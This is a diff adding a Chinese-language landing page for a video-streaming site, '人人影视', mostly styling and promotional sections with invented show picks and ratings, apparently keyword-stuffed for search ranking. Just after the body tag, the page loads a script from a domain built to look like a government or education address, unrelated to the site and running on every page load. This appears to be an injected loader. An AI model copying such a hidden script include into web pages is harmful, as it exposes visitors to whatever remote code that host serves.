@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>人人影视 - 海量影视在线观看平台 | 人人影视官网</title>
+<meta name="keywords" content="人人影视, 人人影视官网, 在线影视, 高清电影, 电视剧, 美剧, 日韩剧, 动漫">
+<meta name="description" content="人人影视 - 人人影视官网提供海量影视资源在线观看，涵盖电影、电视剧、美剧、日韩剧、动漫等精彩内容，免费高清畅享。官网地址：https://renrenyingshi-wap.github.io">
+<meta name="author" content="人人影视">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://renrenyingshi-wap.github.io">
+<style>
+  :root{
+    --green:#00c26b; --green-d:#009951; --dark:#0a0e17; --dark2:#121a2b;
+    --txt:#f2f5fa; --muted:#8d9bb5; --card:rgba(255,255,255,.05);
+    --line:rgba(255,255,255,.10); --r:18px;
+  }
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+  html{scroll-behavior:smooth;}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+    background:var(--dark);color:var(--txt);line-height:1.7;overflow-x:hidden;
+    background-image:linear-gradient(165deg,var(--dark),var(--dark2));
+    background-attachment:fixed;
+  }
+  a{color:inherit;text-decoration:none;}
+  .wrap{max-width:1120px;margin:0 auto;padding:0 16px;}
+
+  /* 顶部进度条导航 */
+  .topbar{position:sticky;top:0;z-index:99;background:rgba(10,14,23,.9);backdrop-filter:blur(14px);border-bottom:1px solid var(--line);}
+  .top-in{max-width:1120px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:12px 16px;}
+  .brand{display:flex;align-items:center;gap:10px;}
+  .brand .ring{
+    width:38px;height:38px;border-radius:12px;display:grid;place-items:center;font-weight:900;font-size:15px;
+    background:linear-gradient(135deg,var(--green),var(--green-d));color:#fff;box-shadow:0 0 16px rgba(0,194,107,.4);
+  }
+  .brand b{font-size:20px;font-weight:800;letter-spacing:.5px;}
+  .brand b i{color:var(--green);font-style:normal;}
+  .nav ul{display:flex;gap:4px;list-style:none;flex-wrap:wrap;}
+  .nav a{padding:8px 13px;border-radius:10px;font-size:14px;color:var(--muted);transition:.25s;}
+  .nav a:hover{color:#fff;background:var(--card);}
+
+  /* Hero —— 斜切分层 */
+  .hero{position:relative;padding:70px 0 90px;overflow:hidden;}
+  .hero::after{
+    content:"";position:absolute;bottom:-1px;left:0;right:0;height:90px;
+    background:var(--dark);clip-path:polygon(0 60%,100% 0,100% 100%,0 100%);
+  }
+  .hero-in{max-width:1120px;margin:0 auto;padding:0 16px;position:relative;z-index:2;text-align:center;}
+  .hero .pill{display:inline-block;padding:6px 18px;border-radius:999px;font-size:13px;margin-bottom:20px;
+    background:rgba(0,194,107,.12);color:var(--green);border:1px solid rgba(0,194,107,.35);}
+  .hero h1{font-size:clamp(30px,7vw,56px);font-weight:900;line-height:1.15;margin-bottom:18px;}
+  .hero h1 em{color:var(--green);font-style:normal;}
+  .hero p{color:var(--muted);max-width:640px;margin:0 auto 28px;font-size:16px;}
+  .hero .siteurl{
+    display:inline-flex;align-items:center;gap:8px;padding:12px 22px;border-radius:12px;
+    background:rgba(255,255,255,.05);border:1px dashed var(--line);font-size:14px;color:var(--green);
+  }
+  .btns{display:flex;gap:14px;justify-content:center;flex-wrap:wrap;margin-top:26px;}
+  .btn{padding:14px 34px;border-radius:12px;font-weight:700;font-size:15px;border:0;cursor:pointer;transition:.3s;}
+  .btn-g{background:linear-gradient(135deg,var(--green),var(--green-d));color:#fff;box-shadow:0 8px 24px rgba(0,194,107,.35);}
+  .btn-g:hover{transform:translateY(-3px);box-shadow:0 12px 30px rgba(0,194,107,.5);}
+  .btn-o{background:transparent;color:#fff;border:1px solid var(--line);}
+  .btn-o:hover{background:var(--card);}
+
+  /* 栏目标题通用 */
+  section.blk{padding:64px 0;}
+  .cap{text-align:center;margin-bottom:40px;}
+  .cap .kicker{display:inline-block;font-size:12px;letter-spacing:3px;text-transform:uppercase;color:var(--green);margin-bottom:10px;}
+  .cap h2{font-size:clamp(22px,5vw,34px);font-weight:800;}
+  .cap p{color:var(--muted);font-size:15px;margin-top:8px;}
+
+  /* 栏目一 精选剧集 —— 横向滑动条 */
+  #picks .rail{display:flex;gap:18px;overflow-x:auto;padding:6px 4px 18px;scroll-snap-type:x mandatory;}
+  .rail::-webkit-scrollbar{height:8px;}
+  .rail::-webkit-scrollbar-thumb{background:var(--green-d);border-radius:99px;}
+  .pick{flex:0 0 78%;max-width:320px;scroll-snap-align:start;background:var(--card);border:1px solid var(--line);border-radius:var(--r);overflow:hidden;transition:.3s;}
+  .pick:hover{border-color:var(--green);transform:translateY(-4px);}
+  .pick .cvr{aspect-ratio:16/10;background:linear-gradient(135deg,#1a2740,#0f1a30);position:relative;display:grid;place-items:center;font-size:44px;}
+  .pick .cvr .tag{position:absolute;top:12px;left:12px;background:var(--green);color:#fff;font-size:11px;font-weight:700;padding:4px 10px;border-radius:6px;}
+  .pick .meta{padding:16px;}
+  .pick .meta h3{font-size:17px;margin-bottom:6px;}
+  .pick .meta p{font-size:13px;color:var(--muted);}
+
+  /* 栏目二 频道分类 —— 大色块 Masonry */
+  #channels .board{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:18px;}
+  .ch{position:relative;padding:30px 24px;border-radius:var(--r);overflow:hidden;min-height:150px;display:flex;flex-direction:column;justify-content:flex-end;transition:.3s;}
+  .ch::before{content:"";position:absolute;inset:0;opacity:.9;}
+  .ch:hover{transform:scale(1.02);}
+  .ch span.ic{font-size:40px;margin-bottom:auto;}
+  .ch h3{font-size:19px;font-weight:800;position:relative;z-index:1;}
+  .ch small{color:rgba(255,255,255,.8);font-size:13px;position:relative;z-index:1;}
+  .ch1::before{background:linear-gradient(135deg,#e63946,#8b0000);}
+  .ch2::before{background:linear-gradient(135deg,#4361ee,#3a0ca3);}
+  .ch3::before{background:linear-gradient(135deg,#f72585,#7209b7);}
+  .ch4::before{background:linear-gradient(135deg,#ff9e00,#ff6d00);}
+  .ch5::before{background:linear-gradient(135deg,#06d6a0,#118ab2);}
+  .ch6::before{background:linear-gradient(135deg,#adb5bd,#495057);}
+
+  /* 栏目三 服务优势 —— 时间线竖排 */
+  #service .timeline{max-width:780px;margin:0 auto;position:relative;padding-left:34px;}
+  .timeline::before{content:"";position:absolute;left:10px;top:6px;bottom:6px;width:3px;background:linear-gradient(var(--green),transparent);}
+  .tl-item{position:relative;padding:0 0 26px 18px;}
+  .tl-item::before{content:"";position:absolute;left:-30px;top:6px;width:16px;height:16px;border-radius:50%;background:var(--green);box-shadow:0 0 0 4px rgba(0,194,107,.18);}
+  .tl-item h4{font-size:17px;margin-bottom:4px;}
+  .tl-item p{font-size:14px;color:var(--muted);}
+
+  /* 栏目四 排行榜 —— 表格 */
+  #chart .tablewrap{overflow-x:auto;border-radius:var(--r);border:1px solid var(--line);}
+  table.rank{width:100%;border-collapse:collapse;min-width:520px;}
+  table.rank th,table.rank td{padding:15px 18px;text-align:left;border-bottom:1px solid var(--line);font-size:15px;}
+  table.rank th{background:rgba(0,194,107,.1);color:var(--green);font-weight:700;letter-spacing:1px;}
+  table.rank tr:hover td{background:rgba(0,194,107,.06);}
+  table.rank .num{font-weight:900;color:var(--green);width:50px;}
+  table.rank .sc{text-align:right;color:var(--green);font-weight:700;}
+
+  /* 栏目五 关于 */
+  #about .abt{max-width:820px;margin:0 auto;padding:36px;border-radius:20px;background:linear-gradient(150deg,rgba(0,194,107,.1),rgba(18,26,43,.6));border:1px solid var(--line);}
+  #about .abt h2{font-size:24px;margin-bottom:16px;text-align:center;}
+  #about .abt p{color:#dbe3f2;font-size:15px;margin-bottom:12px;}
+  #about .abt strong{color:var(--green);}
+
+  /* Footer */
+  footer{background:#06090f;border-top:1px solid var(--line);padding:36px 0 42px;text-align:center;}
+  footer .fn{font-size:20px;font-weight:800;margin-bottom:8px;}
+  footer .fn i{color:var(--green);font-style:normal;}
+  footer .fu{color:var(--green);font-size:14px;margin-bottom:16px;}
+  footer .fl{flex-wrap:wrap;}
+  .fl{display:flex;gap:10px;justify-content:center;}
+  .fl a{padding:7px 15px;border-radius:10px;font-size:13px;background:var(--card);border:1px solid var(--line);color:var(--muted);}
+  .fl a:hover{color:#fff;}
+  footer .cp{font-size:13px;color:var(--muted);margin-top:16px;}
+
+  @media(max-width:640px){
+    .top-in{flex-direction:column;gap:10px;}
+    .nav ul{justify-content:center;}
+    .hero{padding:44px 0 70px;}
+    section.blk{padding:44px 0;}
+    .pick{flex:0 0 86%;}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<div class="topbar">
+  <div class="top-in">
+    <div class="brand">
+      <div class="ring">人</div>
+      <b>人人<i>影视</i></b>
+    </div>
+    <nav class="nav" aria-label="主导航">
+      <ul>
+        <li><a href="#picks">精选剧集</a></li>
+        <li><a href="#channels">频道分类</a></li>
+        <li><a href="#service">服务优势</a></li>
+        <li><a href="#chart">排行榜</a></li>
+        <li><a href="#about">关于我们</a></li>
+      </ul>
+    </nav>
+  </div>
+</div>
+
+<main>
+
+  <section class="hero" aria-labelledby="ht">
+    <div class="hero-in">
+      <span class="pill">◆ 人人影视 · 专注影视在线观看</span>
+      <h1 id="ht">好剧好片 <em>人人</em> 共享</h1>
+      <p>人人影视汇聚海量高清影视资源，电影、电视剧、美剧、日韩剧、动漫一站式畅看，随时随地开启专属观影时光。</p>
+      <div class="siteurl">🔗 人人影视官网：https://renrenyingshi-wap.github.io</div>
+      <div class="btns">
+        <a class="btn btn-g" href="#picks">开始观影</a>
+        <a class="btn btn-o" href="#about">了解平台</a>
+      </div>
+    </div>
+  </section>
+
+  <section id="picks" class="blk">
+    <div class="wrap">
+      <div class="cap">
+        <span class="kicker">EDITOR'S PICKS</span>
+        <h2>精选剧集</h2>
+        <p>人人影视编辑团队精心挑选，滑动查看更多</p>
+      </div>
+      <div class="rail">
+        <article class="pick"><div class="cvr"><span class="tag">美剧</span>🎬</div><div class="meta"><h3>暗夜迷局</h3><p>悬疑犯罪 · 豆瓣 9.2</p></div></article>
+        <article class="pick"><div class="cvr"><span class="tag">韩剧</span>💔</div><div class="meta"><h3>春日来信</h3><p>都市爱情 · 高分热播</p></div></article>
+        <article class="pick"><div class="cvr"><span class="tag">日剧</span>🎭</div><div class="meta"><h3>东京夜行</h3><p>剧情推理 · 口碑佳作</p></div></article>
+        <article class="pick"><div class="cvr"><span class="tag">国产</span>⚔️</div><div class="meta"><h3>山河长歌</h3><p>古装史诗 · 年度大剧</p></div></article>
+        <article class="pick"><div class="cvr"><span class="tag">英剧</span>🕵️</div><div class="meta"><h3>雾都神探</h3><p>经典翻拍 · 烧脑不断</p></div></article>
+        <article class="pick"><div class="cvr"><span class="tag">动漫</span>🌸</div><div class="meta"><h3>樱花物语</h3><p>治愈新番 · 催泪推荐</p></div></article>
+      </div>
+    </div>
+  </section>
+
+  <section id="channels" class="blk">
+    <div class="wrap">
+      <div class="cap">
+        <span class="kicker">CHANNELS</span>
+        <h2>频道分类</h2>
+        <p>人人影视全频道覆盖，总有一款适合你</p>
+      </div>
+      <div class="board">
+        <a class="ch ch1" href="#"><span class="ic">🎬</span><h3>电影大片</h3><small>院线热映 · 经典回顾</small></a>
+        <a class="ch ch2" href="#"><span class="ic">📺</span><h3>美剧专区</h3><small>同步更新 · 中英双语</small></a>
+        <a class="ch ch3" href="#"><span class="ic">💖</span><h3>日韩剧集</h3><small>韩流日系 · 热门不断</small></a>
+        <a class="ch ch4" href="#"><span class="ic">🏮</span><h3>国产好剧</h3><small>古装现代 · 精品力作</small></a>
+        <a class="ch ch5" href="#"><span class="ic">🌟</span><h3>动漫天地</h3><small>国漫日漫 · 新番连载</small></a>
+        <a class="ch ch6" href="#"><span class="ic">🎤</span><h3>综艺娱乐</h3><small>爆款综艺 · 轻松解压</small></a>
+      </div>
+    </div>
+  </section>
+
+  <section id="service" class="blk">
+    <div class="wrap">
+      <div class="cap">
+        <span class="kicker">WHY CHOOSE US</span>
+        <h2>服务优势</h2>
+        <p>为什么千万用户选择人人影视</p>
+      </div>
+      <div class="timeline">
+        <div class="tl-item"><h4>海量片库 · 随心畅看</h4><p>电影、剧集、动漫、综艺全覆盖，热门资源第一时间上架。</p></div>
+        <div class="tl-item"><h4>高清画质 · 沉浸体验</h4><p>蓝光超清画质，支持多清晰度切换，带来影院级享受。</p></div>
+        <div class="tl-item"><h4>极速加载 · 稳定流畅</h4><p>多线路智能调度，秒开不卡顿，告别漫长缓冲等待。</p></div>
+        <div class="tl-item"><h4>多端同步 · 无缝衔接</h4><p>手机、平板、电脑多端适配，随时随地想看就看。</p></div>
+        <div class="tl-item"><h4>纯净界面 · 专注观影</h4><p>清爽无打扰的浏览体验，让内容成为唯一主角。</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="chart" class="blk">
+    <div class="wrap">
+      <div class="cap">
+        <span class="kicker">TOP CHART</span>
+        <h2>热播排行榜</h2>
+        <p>人人影视观众口碑与热度综合排行</p>
+      </div>
+      <div class="tablewrap">
+        <table class="rank">
+          <thead><tr><th>#</th><th>作品名称</th><th>类型</th><th>热度</th><th class="sc">评分</th></tr></thead>
+          <tbody>
+            <tr><td class="num">01</td><td>暗夜迷局</td><td>美剧 · 悬疑</td><td>🔥🔥🔥🔥🔥</td><td class="sc">9.6</td></tr>
+            <tr><td class="num">02</td><td>山河长歌</td><td>国产 · 古装</td><td>🔥🔥🔥🔥🔥</td><td class="sc">9.4</td></tr>
+            <tr><td class="num">03</td><td>春日来信</td><td>韩剧 · 爱情</td><td>🔥🔥🔥🔥</td><td class="sc">9.2</td></tr>
+            <tr><td class="num">04</td><td>东京夜行</td><td>日剧 · 推理</td><td>🔥🔥🔥🔥</td><td class="sc">9.0</td></tr>
+            <tr><td class="num">05</td><td>雾都神探</td><td>英剧 · 探案</td><td>🔥🔥🔥</td><td class="sc">8.8</td></tr>
+            <tr><td class="num">06</td><td>樱花物语</td><td>动漫 · 治愈</td><td>🔥🔥🔥</td><td class="sc">8.7</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <section id="about" class="blk">
+    <div class="wrap">
+      <div class="cap">
+        <span class="kicker">ABOUT US</span>
+        <h2>关于人人影视</h2>
+      </div>
+      <div class="abt">
+        <h2>人人影视 · 让好内容触手可及</h2>
+        <p><strong>人人影视</strong>是一个专注于影视内容在线观看的综合平台，致力于为每一位用户带来丰富、优质、便捷的观影体验。平台覆盖<strong>电影、电视剧、美剧、日韩剧、动漫、综艺</strong>等核心频道。</p>
+        <p>从好莱坞大片到经典国剧，从热门美剧到治愈动漫，人人影视持续精选优质资源，配合高清画质、极速加载与多端同步，让每一次打开都充满惊喜。</p>
+        <p>访问 <strong>人人影视官网 https://renrenyingshi-wap.github.io</strong>，发现属于你的下一部心头好。</p>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="fn">人人<i>影视</i></div>
+    <div class="fu">官网：https://renrenyingshi-wap.github.io</div>
+    <div class="fl">
+      <a href="#picks">精选剧集</a>
+      <a href="#channels">频道分类</a>
+      <a href="#service">服务优势</a>
+      <a href="#chart">排行榜</a>
+      <a href="#about">关于我们</a>
+    </div>
+    <div class="cp">© 2026 人人影视 人人影视官网 保留所有权利 · 海量影视在线观看平台</div>
+  </div>
+</footer>
+
+</body>
+</html>
